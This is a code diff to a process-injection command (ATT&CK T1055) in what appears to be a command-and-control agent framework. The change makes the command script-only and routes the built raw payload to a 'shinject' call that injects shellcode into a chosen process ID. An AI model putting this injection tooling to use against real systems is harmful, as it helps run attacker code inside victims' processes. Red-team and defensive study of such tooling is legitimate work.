@@ -32,6 +32,7 @@ class InjectCommand(CommandBase):
     is_download_file = False
     is_upload_file = False
     is_remove_file = False
+    script_only = True
     author = "@djhohnstein"
     argument_class = InjectArguments
     attackmapping = ["T1055"]
@@ -56,8 +57,13 @@ class InjectCommand(CommandBase):
                         if len(pe) > 1 and pe[:2] == b"\x4d\x5a":
                             raise Exception("Inject requires a payload of Raw output, but got an executable.")
                         # it's done, so we can register a file for it
-                        task.args.add_arg("template", resp.response["file"]['agent_file_id'])
-                        task.display_params = "payload '{}' into PID {} ({})".format(temp.response["tag"], task.args.get_arg("pid"), task.args.get_arg("arch"))
+                        task.args.add_arg("shellcode", resp.response["file"]['agent_file_id'])
+                        task.args.remove_arg("template")
+                        task.display_params = "payload '{}' into PID {}".format(temp.response["tag"], task.args.get_arg("pid"))
+                        response = await MythicRPC().execute("shinject", pid=task.args.get_arg("pid"), shellcode=pe)
+                        task.status = response.status
+                        task.stderr = response.stderr
+                        task.stdout = response.stdout
                         break
                     elif resp.response["build_phase"] == 'error':
                         raise Exception("Failed to build new payload: " + resp.response["error_message"])
